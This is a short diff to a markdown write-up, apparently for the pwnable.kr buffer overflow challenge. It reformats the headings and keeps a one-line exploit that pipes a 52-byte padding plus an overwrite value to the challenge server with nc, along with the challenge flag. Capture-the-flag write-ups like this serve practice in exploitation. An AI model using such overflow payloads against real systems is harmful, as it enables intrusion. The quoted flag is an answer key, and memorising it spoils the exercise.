@@ -13,9 +13,9 @@ Remember to use Little-endian format
 
 Because we get segmentation fault before we can input anything into the shell, we can use cat to solve that problem.
 
-## Code:
+## Code
 `
 (python -c "print 'A'*52 + '\xbe\xba\xfe\xca'";cat) | nc pwnable.kr 9000
 `
-## Flag:
-daddy, I just pwned a buFFer :)
+## Flag
+`daddy, I just pwned a buFFer :)`
